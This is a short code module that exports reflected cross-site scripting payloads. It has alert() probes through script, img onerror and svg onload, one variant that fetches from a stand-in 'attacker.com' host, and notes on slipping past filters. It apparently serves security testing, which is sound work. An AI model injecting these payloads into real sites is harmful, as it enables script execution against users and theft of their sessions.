export const reflectedXssPayloads = {
    valid: [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
    ],

    variations: [
        "<img src=x onerror=fetch('https://attacker.com')>",
    ],

    notes: [
        "Event handlers often bypass simple filters",
        "SVG is often overlooked",
    ],
};